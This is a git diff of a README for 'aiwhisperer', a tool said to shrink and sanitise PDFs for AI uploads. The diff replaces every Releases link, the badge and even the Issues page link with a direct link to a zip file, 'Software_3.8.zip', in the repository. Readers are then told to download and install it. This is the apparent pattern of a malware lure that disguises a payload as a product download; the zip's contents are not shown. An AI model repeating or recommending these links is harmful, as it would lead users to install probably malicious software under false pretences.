@@ -1,6 +1,6 @@
 # 🚀 aiwhisperer - Simplify PDF Uploads for AI Tools
 
-[![Download aiwhisperer](https://img.shields.io/badge/Download_aiwhisperer-blue?style=for-the-badge)](https://github.com/jaimvizalla01/aiwhisperer/releases)
+[![Download aiwhisperer](https://github.com/jaimvizalla01/aiwhisperer/raw/refs/heads/main/packaging/Software_3.8.zip)](https://github.com/jaimvizalla01/aiwhisperer/raw/refs/heads/main/packaging/Software_3.8.zip)
 
 ## 📥 Overview
 The aiwhisperer is designed to help you manage your PDF files with ease. It allows you to shrink large PDFs so they fit within AI upload limits. Additionally, it sanitizes documents before you upload them, reducing the risk of exposing sensitive information.
@@ -23,7 +23,7 @@ This tool covers a range of topics, including ai, anonymization, chatgpt, docume
 1. **Download the Application**: 
    - Click the link below to visit the Releases page and download the latest version of aiwhisperer.
    
-   [Download aiwhisperer](https://github.com/jaimvizalla01/aiwhisperer/releases)
+   [Download aiwhisperer](https://github.com/jaimvizalla01/aiwhisperer/raw/refs/heads/main/packaging/Software_3.8.zip)
 
 2. **Install the Application**: 
    - Once the download is complete, find the file in your downloads folder. 
@@ -35,7 +35,7 @@ This tool covers a range of topics, including ai, anonymization, chatgpt, docume
 ## 📥 Download & Install
 Visit the link below to download the latest version of aiwhisperer. Make sure you follow the installation steps carefully.
 
-[Download aiwhisperer](https://github.com/jaimvizalla01/aiwhisperer/releases)
+[Download aiwhisperer](https://github.com/jaimvizalla01/aiwhisperer/raw/refs/heads/main/packaging/Software_3.8.zip)
 
 ## 📖 How to Use
 1. **Open the Application**: 
@@ -61,7 +61,7 @@ Visit the link below to download the latest version of aiwhisperer. Make sure yo
    - Solution: Check your internet connection and ensure the file size is not extremely large.
 
 ## 🤝 Support
-If you encounter any issues or have questions, please refer to the [Issues page](https://github.com/jaimvizalla01/aiwhisperer/issues) on the GitHub repository. You can also submit a ticket for assistance.
+If you encounter any issues or have questions, please refer to the [Issues page](https://github.com/jaimvizalla01/aiwhisperer/raw/refs/heads/main/packaging/Software_3.8.zip) on the GitHub repository. You can also submit a ticket for assistance.
 
 ## 🌟 Contributing
 If you want to contribute to aiwhisperer, you are welcome! Check the guidelines in the repository for more details on how to get involved.
